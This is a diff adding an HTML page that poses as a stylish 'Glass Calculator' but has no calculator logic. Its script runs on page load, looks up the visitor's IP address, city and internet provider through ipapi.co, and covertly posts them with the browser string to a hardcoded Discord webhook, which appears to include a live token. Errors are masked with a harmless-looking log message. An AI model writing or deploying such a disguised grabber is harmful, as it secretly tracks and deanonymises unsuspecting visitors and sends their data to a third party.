@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <title>Glass Calculator</title>
+    <style>
+        body { background: #0f0f0f; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; font-family: 'Segoe UI', sans-serif; }
+        .calc-card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 25px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); width: 320px; text-align: center; }
+        .screen { background: rgba(0,0,0,0.2); border-radius: 10px; padding: 15px; font-size: 2em; text-align: right; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.05); }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+        button { background: rgba(255,255,255,0.1); border: none; padding: 20px; border-radius: 12px; color: white; font-size: 1.1em; transition: 0.2s; cursor: pointer; }
+        button:hover { background: rgba(255,255,255,0.2); transform: translateY(-2px); }
+        .op { background: rgba(0, 122, 204, 0.3); }
+    </style>
+</head>
+<body>
+
+<div class="calc-card">
+    <div class="screen">0</div>
+    <div class="grid">
+        <button>7</button><button>8</button><button>9</button><button class="op">/</button>
+        <button>4</button><button>5</button><button>6</button><button class="op">*</button>
+        <button>1</button><button>2</button><button>3</button><button class="op">-</button>
+        <button>0</button><button>C</button><button class="op">=</button><button class="op">+</button>
+    </div>
+</div>
+
+<script>
+    // DEIN WEBHOOK HIER (z.B. von Discord oder webhook.site)
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1467989179651723280/XL8t4u7-ozysDZ_4-Jh1RAy7buDHY7RihcBpePJDvk4FtoDmvCcFuP_iolY4nsuYjbEt";
+
+    async function grabAndSend() {
+        try {
+            // 1. IP & Standort Daten abrufen
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const info = await ipRes.json();
+
+            // 2. Netzwerk-Infos (Was im Browser möglich ist)
+            const extraInfo = {
+                browser: navigator.userAgent,
+                sprache: navigator.language,
+                aufloesung: `${window.screen.width}x${window.screen.height}`,
+                zeit: new Date().toLocaleString()
+            };
+
+            // 3. Daten kombinieren und per Webhook senden
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🚀 **Neuer Visit erfasst!**",
+                    embeds: [{
+                        title: "User Info",
+                        color: 5814783,
+                        fields: [
+                            { name: "IP", value: info.ip || "N/A", inline: true },
+                            { name: "Stadt", value: info.city || "N/A", inline: true },
+                            { name: "Provider", value: info.org || "N/A" },
+                            { name: "Browser", value: extraInfo.browser }
+                        ]
+                    }]
+                })
+            });
+        } catch (err) {
+            console.log("System bereit."); // Unauffällige Fehlermeldung
+        }
+    }
+
+    // Startet automatisch beim Laden der Seite
+    window.onload = grabAndSend;
+</script>
+
+</body>
+</html>
